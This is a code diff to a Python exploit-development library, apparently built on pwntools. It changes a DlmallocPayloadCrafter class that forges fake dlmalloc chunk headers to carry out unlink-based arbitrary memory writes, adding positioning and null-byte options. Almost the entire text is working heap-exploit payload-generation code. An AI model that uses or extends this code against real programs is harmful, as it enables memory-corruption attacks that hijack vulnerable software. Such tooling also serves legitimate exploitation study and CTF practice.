@@ -46,7 +46,6 @@ class DlmallocPayloadCrafter(object):
         self.source               = source
         self.destination_2        = kw.get("destination_2", None)
         self.source_2             = kw.get("source_2", None)
-        self.only_fwd_consol      = kw.get("only_fwd_consol", False)
         self.no_back_consol       = kw.get("no_back_consol", False)
         self.pre_length           = kw.get("pre_length", None)
         self.post_length          = kw.get("post_length", None)
@@ -54,6 +53,12 @@ class DlmallocPayloadCrafter(object):
         self.post_preset          = kw.get("post_preset", {})
         self.populating_character = kw.get("populating_character", "*")
         self.size                 = kw.get("size", context.bits/8)
+        self.positioning          = kw.get("positioning", {"AFTER_C" : "prev",
+                                                           "BEFORE_C": "post"})
+        self.allow_null_bytes     = kw.get("allow_null_bytes", False)
+        self.no_fwd_consol        = False
+        if not self.destination_2 and not self.source_2:
+            self.no_fwd_consol        = True
 
     def can_use(self, content, start, length):
         """
@@ -140,6 +145,7 @@ class DlmallocPayloadCrafter(object):
             if backward: i += 1
             else: i -= 2
 
+
     def generate_payload(self):
         """
         Generate the payload that will be used to perform arbitrary memory
@@ -162,47 +168,65 @@ class DlmallocPayloadCrafter(object):
         prev = self.populate_content(presets=self.pre_preset,  length=self.pre_length)
         post = self.populate_content(presets=self.post_preset, length=self.post_length)
 
-        # If we can use backward consolidation to write the exploit
-        if not self.only_fwd_consol:
-            # Find a contiguous chunk of (self.size*4) bytes that can
-            # be used
-            i, unit_len = 0, self.size*4
+        PREV_SIZE_C, SIZE_C = None, None
 
-            # -16 and -15 are random values for the BEFORE_C's PREV_SIZE and SIZE
-            values_list = [-16, -15, self.destination-12, self.source]
-            PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length)
-            if PREV_SIZE_C == None: PREV_SIZE_C = -1
-            else: PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))
-
-        # If we need to use forward consolidation
-        if self.only_fwd_consol or (self.destination_2 and self.source_2):
-            raise HeaplibException("Forward consolidation not supported yet.")
-            pass
-
-        # If no forward consolidation, fill with values that don't cause
-        # a crash
-        else:
-            # Find a contiguous chunk towards the end of `prev` that can be
-            # used to place
-            # i == 8 as we don't want MMAP flag to trigger
-            i, unit_len = len(prev)-8, self.size*3
-            i -= unit_len
-            # Lets see if the payload size can be reduced, as we don't really need
-            # forward consolidation.
-            if prev[-self.size*2:] == [self.populating_character]*self.size*2 and PREV_SIZE_C == -4:
-                SIZE_C = -self.size
-                after_c = flat(-1, -1) # this value is not used
-                prev[-self.size*2:] = list(after_c)
-            else:
-                if (i % 2) != 0: i -= 1
-                values_list = [-1, -1, -3]
-                SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, backward=False)
-                SIZE_C = SIZE_C + 4
-                SIZE_C = -(len(prev) - SIZE_C)
+        # First we position and place "BEFORE_C"
+        if self.positioning["BEFORE_C"] == "post":
             if self.no_back_consol:
-                SIZE_C |= 1
+                pass
             else:
-                SIZE_C &= (-2)   # fffffffe or its equivalent based on arch
+                # If this step fails, set no_fwd_consol to False
+                i, unit_len = 0, self.size*4
+
+                # -16 and -15 are random values for the BEFORE_C's PREV_SIZE and SIZE
+                values_list = [-16, -15, self.destination-12, self.source]
+                PREV_SIZE_C = self.find_usable_offset(i, post, unit_len, values_list, self.post_length)
+                if PREV_SIZE_C == None: PREV_SIZE_C = -1
+                else: PREV_SIZE_C = -(PREV_SIZE_C + (self.size*2))
+
+        elif self.positioning["BEFORE_C"] == "prev":
+            if not self.allow_null_bytes:
+                raise HeaplibException("Cannot place BEFORE_C in prev without allowing"\
+                                       "null-bytes in PREV_SIZE")
+            if self.no_back_consol:
+                pass
+            else:
+                pass
+
+        # Next we try to place "AFTER_C"
+        if self.positioning["AFTER_C"] == "prev":
+            if self.no_fwd_consol:
+                # Find a contiguous chunk towards the end of `prev` that can be
+                # used to place
+                # i == 8 as we don't want MMAP flag to trigger
+                i, unit_len = len(prev)-8, self.size*3
+                i -= unit_len
+                # Lets see if the payload size can be reduced, as we don't really need
+                # forward consolidation.
+                if prev[-self.size*2:] == [self.populating_character]*self.size*2 and PREV_SIZE_C == -4:
+                    SIZE_C = -self.size
+                    after_c = flat(-1, -1) # this value is not used
+                    prev[-self.size*2:] = list(after_c)
+                else:
+                    if (i % 2) != 0: i -= 1
+                    values_list = [-1, -1, -3]
+                    SIZE_C = self.find_usable_offset(i, prev, unit_len, values_list, self.pre_length, backward=False)
+                    SIZE_C = SIZE_C + 4
+                    SIZE_C = -(len(prev) - SIZE_C)
+                if self.no_back_consol:
+                    SIZE_C |= 1
+                else:
+                    SIZE_C &= (-2)   # fffffffe or its equivalent based on arch
+            else:
+                raise HeaplibException("Forward consolidation not supported yet.")
+        elif self.positioning["AFTER_C"] == "post":
+            if not self.allow_null_bytes:
+                raise HeaplibException("Cannot place AFTER_C in post without allowing"\
+                                       "null-bytes in SIZE")
+            if self.no_fwd_consol:
+                pass
+            else:
+                pass
 
         log.debug("-=================================]")
         log.debug("prev length = %d" % len(prev))
@@ -224,4 +248,5 @@ class HeapPayloadCrafter(object):
 
     def generate_payload(self):
         return self.payload_crafter.generate_payload()
+
 
